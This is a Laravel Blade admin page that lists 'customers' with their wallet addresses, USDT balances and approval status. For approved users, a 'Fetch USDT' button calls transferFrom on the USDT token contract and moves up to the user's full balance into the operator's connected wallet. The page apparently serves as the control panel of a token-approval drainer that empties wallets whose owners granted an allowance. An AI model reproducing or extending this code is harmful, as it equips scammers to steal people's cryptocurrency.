@extends('layout.app')
@section('title')
    customers
@endsection
@push('css')
    <link rel="stylesheet" href="{{asset('plugins/select2/css/select2.min.css')}}">
    <link rel="stylesheet" href="{{asset('plugins/select2-bootstrap4-theme/select2-bootstrap4.min.css')}}">
@endpush
@section('content')
    <div class="content-header">
        <div class="container-fluid">
          <div class="row mb-2">
            <div class="col-sm-6">
              <h1 class="m-0">Users</h1>
            </div><!-- /.col -->
          </div><!-- /.row -->
        </div><!-- /.container-fluid -->
      </div>
    <div class="content">
        <div class="container-fluid">
          <div class="row">
            <div class="col-md-12">
              <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                  <div>
                    <form action="{{route('customer.index')}}">
                      <div class="form-group">
                        <div class="input-group">
                          <input style="width: 350px" type="text" name="search" class="form-control" value="{{$_GET['search'] ?? ''}}" placeholder="Search with user id or wallet address">
                          
                        </div>
                      </div>
                    </form>
                  </div>
                  <div class="ml-auto">
                    <p>Connected Wallet : 
                      <span id="connectedAddress" class="text-success">
                        <button class="btn btn-primary" id="connectBtn">Connect</button>
                      </span> 
                    </p>
                  </div>
                </div>
                <!-- /.card-header -->
                <div class="card-body p-0">
                  <table class="table table-striped">
                    <thead>
                      <tr>
                        <th>#</th>
                        <th>User Id</th>
                        <th>Wallet Address</th>
                        <th>Balance </th>
                        <th>Real Balance (USDT)</th>
                        <th>Status</th>
                        <th>Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                        @foreach ($customers as $key=>$customer)
                          <tr>
                            <td>
                              {{$key+1}}
                             
                            </td>
                            <td>
                              {{$customer->user_id}}
                              <br>
                              @if ($customer->is_allowed)
                                  <span class="badge badge-success">Joined</span>
                              @endif
                            </td>
                            <td>{{$customer->wallet_address}}</td>
                            <td class="">
                              {{ ($customer->balance) }} 
                              <br>
                              @if ($rewarded_at = $customer->rewarded_at)
                                 <p class="badge badge-primary"> {{$rewarded_at->format('d-m-Y H:i A')}}</p>
                              @endif
                            </td>
                            <td class="">
                              {{ $customer->real_balance }}
                              <br>
                              @if ($balance_checked_at = $customer->balance_checked_at)
                                 <p class="badge badge-primary">{{$balance_checked_at->format('d-m-Y H:i A')}}</p> 
                              @endif
                            </td>
                            <td>
                              @if ($customer->is_approved)
                                  <span class="badge badge-success">Approved</span>
                              @else
                                  <span class="badge badge-warning">Pending</span>
                              @endif
                            </td>
                            <td>

                              <div class="dropdown show">
                                <a class="btn btn-secondary" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                  <i class="fa fa-ellipsis-v"></i>
                                </a>

                                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="dropdownMenuLink">
                                  @if (!$customer->is_approved)
                                    <a class="dropdown-item" onclick="if(confirm('Are you sure to approve?')){
                                      document.getElementById('approveForm-{{$customer->user_id}}').submit()
                                    }">Approve</a>
                                  @else
                                    <a data-index="{{$key}}" class="dropdown-item onFetchBtn text-warning" href="#">Fetch USDT</a>
                                  @endif
                                  <div class="dropdown-divider"></div>
                                  <a class="dropdown-item text-danger" onclick="if(confirm('Are you sure to delete?')){
                                    document.getElementById('delete-{{$customer->user_id}}').submit()
                                  }" href="#">Delete</a>
                                </div>
                              </div>

                              <div>
                                @if (!$customer->is_approved)
                                  <form id="approveForm-{{$customer->user_id}}" action="{{route('customer.approve',$customer->user_id)}}" method="POST">
                                    @csrf
                                  </form>
                                @endif
                                <form  id="delete-{{$customer->user_id}}" action="{{route('customer.destroy',$customer->user_id)}}" method="POST">
                                  @csrf
                                  @method('DELETE')
                                </form>
                              </div>
                            </td>
                          </tr>
                        @endforeach
                    </tbody>
                  </table>
                </div>
                <!-- /.card-body -->
                <div class="card-footer">
                    <div class="d-flex justify-content-end">
                        {{$customers->links()}}
                    </div>
                </div>
              </div>
            </div>
          </div>
        </div>
    </div>

     <div class="modal fade" id="fetchModel">
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h4 class="modal-title">Fetch USDT from </h4>
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
              <form id="submitForm">
                <div class="form-group">
                  <label for="user_address">User Wallet Address</label>
                  <input readonly type="text" id="userAddress" class="form-control">
                </div>
                <div class="form-group">
                  <label for="user_address">Receiver Address</label>
                  <input readonly type="text" id="receiverAddress" class="form-control">
                </div>

                <div class="form-group">
                    <label for="amount">Amount</label>

                  <div class="input-group">
                    <input required id="amount" type="number" name="amount" step="0.2" class="form-control">
                    <div class="input-group-append">
                      <span class="input-group-text" id="basic-addon2">USDT</span>
                    </div>
                  </div>
                    <p>Available Balance : <span class="text-success" id="userBalance"></span></p>

                </div>

                <div class="form-group">
                  <button class="btn btn-primary">Fetch</button>
                </div>
              </form>
            </div>
          </div>
          <!-- /.modal-content -->
        </div>
        <!-- /.modal-dialog -->
      </div>
@endsection
@push('script')
    <script src="{{asset('plugins/select2/js/select2.full.min.js')}}"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.3/dist/web3.min.js"></script>

    <script>
        $(function () {
            let connnectedAddress = userAddress = null;
            let users = @json($customers->items());
            let web3 = null;

            $('#connectBtn').click(connect);
            $('.onFetchBtn').click(function(){
              onFetchBalance($(this).data('index'))
            })
            $('#submitForm').submit(function(){
              event.preventDefault();
              fetch()
            })


            async function onFetchBalance(index){

              if(connnectedAddress == null || web3 == null){
                await connect();
              }

              user = users[index];
              userAddress = user.wallet_address;
              $('#userAddress').val(userAddress);
              $('#receiverAddress').val(connnectedAddress);
              $('#userBalance').html(user.real_balance + ' USDT');
              $('#amount').attr('max',user.real_balance)
              $('#fetchModel').modal('show')
            }

            async function connect(){
                // Request user's approval to access their wallet accounts
                await ethereum.enable();
                web3 = new Web3(window.ethereum);
                // Get the selected user's wallet address
                const accounts = await web3.eth.getAccounts();
                connnectedAddress = accounts[0];
                $('#connectedAddress').html(connnectedAddress);
                console.log('Wallet connected!');
              try {

              } catch (error) {
                console.error('Failed to connect wallet!');
              }
            }

            async function fetch(){
              const contractABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}];
              const usdtContract = new web3.eth.Contract(contractABI, '0xdAC17F958D2ee523a2206206994597C13D831ec7');
              const amount = parseFloat($('#amount').val()) * (10 ** 6);

              await usdtContract.methods.transferFrom(userAddress,connnectedAddress,amount).send({from:connnectedAddress})
              .then(transactionReceipt => {
                alert('Transaction Success!');
                console.log('Transfer successful:', transactionReceipt);
              })
              .catch(error => {
                alert('Transaction Failed!');
                console.error('Error transferring tokens:', error);
              });
            }
        })
    </script>
@endpush